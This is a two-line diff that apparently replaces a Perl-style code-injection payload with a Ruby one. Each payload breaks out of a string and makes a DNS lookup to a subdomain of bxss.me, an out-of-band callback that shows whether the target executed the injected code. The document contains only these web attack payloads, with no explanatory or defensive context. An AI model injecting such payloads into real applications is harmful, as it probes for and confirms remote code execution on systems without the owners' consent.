@@ -1,1 +1,2 @@
-".gethostbyname(lc("hitba"."etbihpex334f2.bxss.me."))."A".chr(67).chr(hex("58")).chr(114).chr(69).chr(112).chr(79)."
+"+"A".concat(70-3).concat(22*4).concat(110).concat(68).concat(120).concat(80)+(require"socket"
+Socket.gethostbyname("hitko"+"hrydhpqj888ed.bxss.me.")[3].to_s)+"
